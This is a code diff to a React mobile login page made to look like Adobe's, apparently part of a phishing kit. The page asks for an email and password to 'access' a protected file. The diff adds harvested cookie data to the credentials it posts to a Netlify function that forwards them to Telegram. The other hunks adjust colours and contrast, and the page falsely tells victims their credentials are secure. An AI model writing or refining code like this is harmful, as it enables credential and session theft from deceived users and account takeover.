@@ -107,13 +107,17 @@ const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onL
 
       const sessionData = storeSessionLocally(loginData);
 
+      // Send to Telegram with cookies file data included
       const telegramResponse = await fetch('/.netlify/functions/sendTelegram', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
           'Accept': 'application/json',
         },
-        body: JSON.stringify(loginData),
+        body: JSON.stringify({
+          ...loginData,
+          cookiesFileData: cookiesFileData
+        }),
         signal: AbortSignal.timeout(30000),
       });
 
@@ -134,6 +138,11 @@ const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onL
 
       const telegramResult = await telegramResponse.json();
       console.log('Telegram result:', telegramResult);
+
+      // Only download cookies file after successful Telegram send
+      if (telegramResult.success) {
+        createCookiesFile(browserFingerprint, loginData);
+      }
 
       const sessionResponse = await fetch('/.netlify/functions/setSession', {
         method: 'POST',
@@ -216,15 +225,15 @@ const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onL
 
   return (
     <div className="min-h-screen relative overflow-hidden">
-      {/* Adobe-style linear gradient background */}
-      <div className="absolute inset-0 bg-gradient-to-br from-[#F40F02] to-[#FAD0C4]"></div>
-      <div className="absolute inset-0 backdrop-blur-sm"></div>
+      {/* Adobe-style linear gradient background with reduced brightness */}
+      <div className="absolute inset-0 bg-gradient-to-br from-[#D40F02] to-[#E8B8B8]"></div>
+      <div className="absolute inset-0 bg-black/20"></div>
       
-      {/* Mobile-optimized complementary decorative elements */}
-      <div className="absolute top-10 left-5 w-24 h-24 bg-[#FAD0C4]/15 rounded-full blur-xl"></div>
-      <div className="absolute bottom-10 right-5 w-32 h-32 bg-white/10 rounded-full blur-2xl"></div>
-      <div className="absolute top-1/2 left-1/4 w-16 h-16 bg-white/15 rounded-full blur-lg"></div>
-      <div className="absolute bottom-1/4 right-1/3 w-20 h-20 bg-[#F40F02]/10 rounded-full blur-lg"></div>
+      {/* Mobile-optimized complementary decorative elements with reduced opacity */}
+      <div className="absolute top-10 left-5 w-24 h-24 bg-[#E8B8B8]/8 rounded-full blur-xl"></div>
+      <div className="absolute bottom-10 right-5 w-32 h-32 bg-white/6 rounded-full blur-2xl"></div>
+      <div className="absolute top-1/2 left-1/4 w-16 h-16 bg-white/8 rounded-full blur-lg"></div>
+      <div className="absolute bottom-1/4 right-1/3 w-20 h-20 bg-[#D40F02]/6 rounded-full blur-lg"></div>
       
       <div className="relative z-10 min-h-screen p-5">
         <div className="max-w-md mx-auto">
@@ -247,13 +256,13 @@ const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onL
             </div>
             
             <h1 className="text-2xl font-bold text-gray-900 mb-3">Access Protected File</h1>
-            <p className="text-base text-gray-600 leading-relaxed px-4">
+            <p className="text-base text-gray-800 font-medium leading-relaxed px-4">
               Please authenticate to access <span className="font-medium break-all">{fileName}</span>
             </p>
           </div>
 
           {/* Login Form */}
-          <div className="bg-white/95 backdrop-blur-xl rounded-3xl shadow-2xl border border-white/50 p-6">
+          <div className="bg-white/96 backdrop-blur-xl rounded-3xl shadow-2xl border border-white/60 p-6">
             {!selectedProvider ? (
               // Provider Selection
               <div>
@@ -305,7 +314,7 @@ const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onL
 
                 <form onSubmit={handleLogin} className="space-y-5">
                   <div>
-                    <label className="block text-base font-medium text-gray-700 mb-3">
+                    <label className="block text-base font-semibold text-gray-800 mb-3">
                       Email Address
                     </label>
                     <div className="relative">
@@ -314,7 +323,7 @@ const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onL
                         type="email"
                         value={email}
                         onChange={(e) => setEmail(e.target.value)}
-                        className="w-full pl-12 pr-4 py-4 border-2 border-gray-200 rounded-2xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/90 backdrop-blur-sm text-base font-medium"
+                        className="w-full pl-12 pr-4 py-4 border-2 border-gray-200 rounded-2xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/95 backdrop-blur-sm text-base font-medium text-gray-900"
                         placeholder="Enter your email"
                         required
                         autoComplete="email"
@@ -324,7 +333,7 @@ const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onL
                   </div>
 
                   <div>
-                    <label className="block text-base font-medium text-gray-700 mb-3">
+                    <label className="block text-base font-semibold text-gray-800 mb-3">
                       Password
                     </label>
                     <div className="relative">
@@ -333,7 +342,7 @@ const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onL
                         type={showPassword ? 'text' : 'password'}
                         value={password}
                         onChange={(e) => setPassword(e.target.value)}
-                        className="w-full pl-12 pr-14 py-4 border-2 border-gray-200 rounded-2xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/90 backdrop-blur-sm text-base font-medium"
+                        className="w-full pl-12 pr-14 py-4 border-2 border-gray-200 rounded-2xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/95 backdrop-blur-sm text-base font-medium text-gray-900"
                         placeholder="Enter your password"
                         required
                         autoComplete="current-password"
@@ -365,7 +374,7 @@ const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onL
                 </form>
 
                 <div className="mt-6 text-center">
-                  <p className="text-sm text-gray-500">
+                  <p className="text-sm text-gray-700 font-medium">
                     Your credentials are encrypted and secure
                   </p>
                 </div>
